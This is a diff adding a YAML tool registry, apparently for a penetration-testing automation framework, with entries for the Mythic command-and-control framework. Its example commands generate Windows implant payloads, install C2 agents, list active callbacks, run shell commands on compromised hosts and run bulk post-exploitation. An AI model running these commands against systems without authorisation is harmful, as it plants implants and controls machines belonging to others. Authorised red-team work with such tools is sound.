@@ -1,0 +1,38 @@
+mythic_c2_script:
+  description: "Mythic C2 automation script — payload creation, callback management, task execution, post-exploitation via GraphQL API"
+  category: "c2"
+  install_cmd: "pip install mythic aiohttp gql"
+  verify_cmd: "python3 /opt/tazosploit/scripts/mythic_c2.py --help"
+  examples:
+    - "python3 /opt/tazosploit/scripts/mythic_c2.py --action create-payload --agent apollo --os windows --arch x64 --c2-profile http --json"
+    - "python3 /opt/tazosploit/scripts/mythic_c2.py --action list-callbacks --json"
+    - "python3 /opt/tazosploit/scripts/mythic_c2.py --action task --callback-id 1 --command shell --params 'whoami' --json"
+    - "python3 /opt/tazosploit/scripts/mythic_c2.py --action post-exploit-all --callback-id 1 --output-dir /pentest/output --json"
+
+mythic_cli:
+  description: "Mythic CLI binary — manages Mythic Docker containers, installs agents and C2 profiles"
+  category: "c2"
+  install_cmd: "cd /opt/mythic && sudo make"
+  verify_cmd: "/opt/mythic/mythic-cli version"
+  examples:
+    - "/opt/mythic/mythic-cli start"
+    - "/opt/mythic/mythic-cli install github https://github.com/MythicAgents/Apollo.git"
+    - "/opt/mythic/mythic-cli install github https://github.com/MythicC2Profiles/http"
+    - "/opt/mythic/mythic-cli status"
+
+curl_graphql:
+  description: "Direct GraphQL API access to Mythic via curl — for quick queries when mythic PyPi is unavailable"
+  category: "c2"
+  install_cmd: "apt-get install -y curl jq"
+  verify_cmd: "curl --version && jq --version"
+  examples:
+    - >
+      curl -s -X POST https://mythic:7443/graphql/ \
+        -H 'Content-Type: application/json' \
+        -H "apitoken: $MYTHIC_API_KEY" \
+        -d '{"query":"{ callback(where: {active: {_eq: true}}) { id host user ip os } }"}' | jq .
+    - >
+      curl -s -X POST https://mythic:7443/graphql/ \
+        -H 'Content-Type: application/json' \
+        -H "apitoken: $MYTHIC_API_KEY" \
+        -d '{"query":"{ payload { id uuid payload_type { name } os build_phase } }"}' | jq .
